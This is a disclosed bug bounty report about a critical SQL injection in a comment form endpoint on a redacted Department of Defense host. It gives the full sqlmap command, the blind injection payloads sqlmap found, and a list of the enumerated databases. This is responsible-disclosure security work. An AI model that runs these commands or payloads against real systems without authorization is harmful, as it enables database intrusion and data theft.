# SQL injection at [https://█████████] [HtUS]

## Report Details
- **Report ID**: 1627995
- **URL**: https://hackerone.com/reports/1627995
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-07-06T14:04:16.935Z
- **Disclosed**: 2022-09-14T21:04:28.150Z

## Reporter
- **Username**: malcolmx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hello,

##Summary

while doing test on [`www.███`](http://www.██████/) I’ve found that the endpoint at [`/olc/███comments/comment_post.php`](https://████████) is vulnerable with SQL injection vulnerability

##Vulnerable parameters 

- staff_student

##POC

- using sqlmap run command

```jsx
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u "https://███████" --data="staff_student=STUDENT&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit+Comments" -p staff_student --dbms=mysql 
```

- we can see that the target parameter is vulnerable

```jsx
POST parameter 'staff_student' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 103 HTTP(s) requests:
---
Parameter: staff_student (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: staff_student=STUDENT'||(SELECT 0x6545736f FROM DUAL WHERE 6919=6919 AND 4128=4128)||'&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: staff_student=STUDENT'||(SELECT 0x615a636e FROM DUAL WHERE 7192=7192 AND (SELECT 4865 FROM (SELECT(SLEEP(5)))VDbe))||'&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments
```

{F1810520}
- add `--dbs` we can see the sqlmap will start get the DBS

```jsx
available databases [13]:
[] █████████
[] ██████mobile
[] GET
[] information_schema
[] LEAM
[] leat
[] LEV
[] mysql
[] performance_schema
[] SET
[] test
[] testadmin
[*] testusers
```


{F1810521}

## Impact

attacker is able to get the database

## Attachments
No attachments
